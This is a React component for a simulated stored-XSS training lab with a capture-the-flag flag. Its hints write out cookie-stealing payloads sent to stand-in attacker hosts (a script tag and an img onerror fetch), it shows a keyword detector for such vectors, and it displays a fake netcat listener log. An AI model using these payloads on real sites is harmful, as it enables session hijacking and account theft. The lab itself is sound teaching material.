"use client";

import { useState } from "react";
import { HintPanel, SolvedBanner } from "./_shared";

const FLAG = "SECLAYER{b7e4d098f3c21a65}";
const ADMIN_COOKIE = `admin_session=${FLAG}; path=/`;

const HINTS = [
  "The comment template uses {{comment | raw}} — the | raw filter disables HTML escaping. Try posting <b>bold</b> and look at the victim view.",
  "The admin moderates comments periodically. A <script> tag in a comment would execute in their browser context, with access to document.cookie.",
  'Try: <script>new Image().src="http://attacker.com/?c="+document.cookie</script> — or the img onerror variant: <img src=x onerror="fetch(\'http://a.com/?c=\'+document.cookie)">',
];

function detectXSS(payload: string): boolean {
  const lower = payload.toLowerCase();
  const hasDocCookie = lower.includes("document.cookie");
  const hasVector =
    lower.includes("<script") ||
    lower.includes("onerror") ||
    lower.includes("onload") ||
    lower.includes("<svg") ||
    lower.includes("javascript:");
  return hasDocCookie && hasVector;
}

type LogEntry = { text: string; kind: "info" | "warn" | "success" };

export function XSSLabTool() {
  const [comment, setComment] = useState("");
  const [comments, setComments] = useState<string[]>([]);
  const [exfilLog, setExfilLog] = useState<LogEntry[]>([]);
  const [solved, setSolved] = useState(false);
  const [hintsUsed, setHintsUsed] = useState(0);

  function post(e: React.FormEvent) {
    e.preventDefault();
    const trimmed = comment.trim();
    if (!trimmed) return;

    setComments((prev) => [...prev, trimmed]);
    setComment("");

    setTimeout(() => {
      const ts = new Date().toLocaleTimeString();
      if (!solved && detectXSS(trimmed)) {
        setExfilLog((prev) => [
          ...prev,
          { text: `[${ts}] Admin visited /comments?action=moderate`, kind: "info" },
          { text: `[${ts}] Payload executed in admin browser context`, kind: "warn" },
          {
            text: `[${ts}] Incoming: GET /collect?c=${encodeURIComponent(ADMIN_COOKIE)} HTTP/1.1`,
            kind: "success",
          },
          { text: `[${ts}] Captured cookie: ${ADMIN_COOKIE}`, kind: "success" },
        ]);
        setSolved(true);
      } else if (!solved) {
        setExfilLog((prev) => [
          ...prev,
          { text: `[${ts}] Admin visited page — no requests to attacker server.`, kind: "info" },
        ]);
      }
    }, 900);
  }

  return (
    <div className="tool-surface space-y-5">
      {/* Scenario */}
      <div
        className="p-4 rounded-lg"
        style={{ background: "var(--bg-surface-2)", border: "1px solid var(--border-subtle)" }}
      >
        <p className="text-xs font-mono mb-1" style={{ color: "var(--text-muted)" }}>
          VULNERABLE TEMPLATE
        </p>
        <pre className="text-xs overflow-x-auto leading-relaxed" style={{ color: "#c4b5fd" }}>
{`{# Jinja2 — comments page #}
{% for comment in comments %}
<div class="comment">
  <span class="body">{{ comment.body | safe }}</span>
</div>
{% endfor %}`}
        </pre>
        <p className="mt-2 text-xs" style={{ color: "var(--text-secondary)" }}>
          The <code style={{ color: "#a5b4fc" }}>| safe</code> filter disables auto-escaping.
          An admin moderates comments every ~30 s.
        </p>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
        {/* Attacker — post comment */}
        <div className="space-y-3">
          <p className="text-xs font-semibold uppercase tracking-wider" style={{ color: "var(--text-muted)" }}>
            Your comment (attacker)
          </p>
          <form onSubmit={post} className="space-y-2">
            <textarea
              value={comment}
              onChange={(e) => setComment(e.target.value)}
              rows={5}
              className="w-full px-3 py-2 rounded-md text-sm font-mono resize-none"
              style={{
                background: "var(--bg-elevated)",
                border: "1px solid var(--border-strong)",
                color: "var(--text-primary)",
              }}
              placeholder="Write a comment (or payload)..."
            />
            <button
              type="submit"
              className="px-4 py-2 rounded-md text-sm font-medium"
              style={{ background: "var(--accent)", color: "white" }}
            >
              Post →
            </button>
          </form>
        </div>

        {/* Victim — comment board (shows raw text, not rendered HTML) */}
        <div>
          <p className="text-xs font-semibold uppercase tracking-wider mb-2" style={{ color: "var(--text-muted)" }}>
            Comment board (stored content)
          </p>
          <div
            className="rounded-lg p-3 space-y-2 min-h-28"
            style={{ background: "var(--bg-elevated)", border: "1px solid var(--border-subtle)" }}
          >
            {comments.length === 0 ? (
              <p className="text-xs" style={{ color: "var(--text-muted)" }}>
                No comments yet.
              </p>
            ) : (
              comments.map((c, i) => (
                <div
                  key={i}
                  className="p-2 rounded text-xs break-all"
                  style={{
                    background: "var(--bg-surface-2)",
                    border: "1px solid var(--border-subtle)",
                  }}
                >
                  <span className="font-mono" style={{ color: "var(--text-muted)" }}>
                    anon:{" "}
                  </span>
                  <span style={{ color: "var(--text-secondary)" }}>{c}</span>
                </div>
              ))
            )}
          </div>
        </div>
      </div>

      {/* Exfil log */}
      {exfilLog.length > 0 && (
        <div
          className="rounded-lg p-4 font-mono text-xs space-y-1"
          style={{ background: "#0a0d18", border: "1px solid var(--border-subtle)" }}
        >
          <p className="mb-2" style={{ color: "var(--text-muted)" }}>
            // attacker&apos;s HTTP listener (nc -lvnp 8080)
          </p>
          {exfilLog.map((entry, i) => (
            <div
              key={i}
              style={{
                color:
                  entry.kind === "success"
                    ? "#6ee7b7"
                    : entry.kind === "warn"
                    ? "#fca5a5"
                    : "var(--text-secondary)",
              }}
            >
              {entry.text}
            </div>
          ))}
        </div>
      )}

      <HintPanel
        hints={HINTS}
        hintsUsed={hintsUsed}
        onReveal={() => setHintsUsed((h) => Math.min(h + 1, HINTS.length))}
      />

      {solved && (
        <SolvedBanner
          flag={FLAG}
          explanation="The stored comment was rendered as raw HTML in the admin's browser. The injected script executed in the admin's page context and had access to document.cookie, which it exfiltrated to an attacker-controlled server. HttpOnly would have prevented this — but the session cookie lacked that flag."
        />
      )}
    </div>
  );
}
